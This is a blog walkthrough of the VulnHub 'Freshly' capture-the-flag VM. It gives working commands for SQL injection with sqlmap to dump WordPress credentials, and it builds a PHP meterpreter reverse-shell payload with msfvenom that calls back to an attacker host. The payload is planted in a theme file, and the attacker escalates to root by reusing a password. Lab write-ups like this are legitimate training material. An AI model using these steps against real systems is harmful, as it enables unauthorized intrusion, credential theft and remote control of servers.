@@ -1,0 +1,302 @@
+
+								
+																		Hack the Freshly VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on December 8, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Here we come with a new article which will all be about a penetration testing challenge called FRESHLY. The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. It’s an easy lab. let’s get started with it and access it.
+Download from here :
+https://www.vulnhub.com/?q=fresh&amp;sort=date-asc&amp;type=vm
+Breaching Methodology
+
+Network Scanning (Nmap)
+Recon (Nikto)
+Login Form Based SQL Injection
+Abusing WordPress
+Generate PHP Backdoor (Msfvenom)
+Upload and execute a backdoor
+Reverse connection (Metasploit)
+Take root access
+
+Let’s Start!!
+So to start with it firstly we have to find out the IP of FRESHLY. For that type the netdiscover command in the terminal of Kali. It will show each IP present in our network.
+Now we have target IP: 192.168.1.112 so let’s scan it with aggressive scan (-A).
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.112
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.112
+					
+				
+			
+		
+
+
+This shows all open ports: 80, 8080, 443.
+As we can see 80 port is open so we will open target IP in our browser to find out what’s in there as our next clue.
+
+Next, we will apply the Nikto command to it. Nitko command will help us to gather information like its files and all the other major stuff that we ought to know about our target. So, therefore, type: Nikto -h [host URL].
+
+After scanning it shows that there is a login.php page found. So open it in a browser with target IP
+
+Since we don’t know the exact username and password, therefore, we have used SQLMAP for login form based injection for retrieving the database name and login credential by executing the following command.
+
+		
+		
+			
+			
+			
+			
+sqlmap -u 'http://192.168.1.112/login.php' --forms --risk=3 --level=5 --dbs
+			
+				
+					
+				
+					1
+				
+						sqlmap -u 'http://192.168.1.112/login.php' --forms --risk=3 --level=5 --dbs
+					
+				
+			
+		
+
+
+From the sqlmap result, we came to that the name of the database could be“wordpress8080”, so now using sqlmap again fetch username and password from that database i.e. WordPress 8080
+
+		
+		
+			
+			
+			
+			
+sqlmap -u 'http://192.168.1.112/login.php' --forms -D wordpress8080 --risk=3 --level=3 --dump-all
+			
+				
+					
+				
+					1
+				
+						sqlmap -u 'http://192.168.1.112/login.php' --forms -D wordpress8080 --risk=3 --level=3 --dump-all
+					
+				
+			
+		
+
+
+Alright, we have achieved our first step by finding out user and password for WordPress.
+
+		
+		
+			
+			
+			
+			
+User = admin
+Password = SuperSecretPassword
+			
+				
+					
+				
+					12
+				
+						User = adminPassword = SuperSecretPassword
+					
+				
+			
+		
+
+Earlier we have already found out our open ports so use one of not used ports to open in browser ie.8080
+Cool…See what you have got…. Now click on this link and you are all set for the further result.
+
+Candy goodness!!!!!  It’s our WordPress page. So let’s get on to other steps by opening a WordPress login page and entering the credentials we found out i.e.
+
+		
+		
+			
+			
+			
+			
+User= admin
+Password= SuperSecretPassword
+			
+				
+					
+				
+					12
+				
+						User= adminPassword= SuperSecretPassword
+					
+				
+			
+		
+
+
+Once you have logged in, make the malicious file that you got to upload in it. Generate code through the msfvenom command:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.132 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.132 lport=4444 -f raw
+					
+				
+			
+		
+
+Side by side in other terminal open Metasploit and run multi handler.
+
+From generated php raw file copy the code from &lt;?php to die(). As we want to read a file on the system, let’s put some PHP code in the theme: We go to Appearance -&gt; themes -&gt; 404.php and add some PHP code in order to execute it.
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.132
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.132msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe Meterpreter session1, now start penetrating for accessing root privilege. Then to access proper TTY shell we had import python one line script by typing following:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+To get root access account credential reuse from the WordPress admin password SuperSecretPassword that allowed su – to escalate privileges.
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
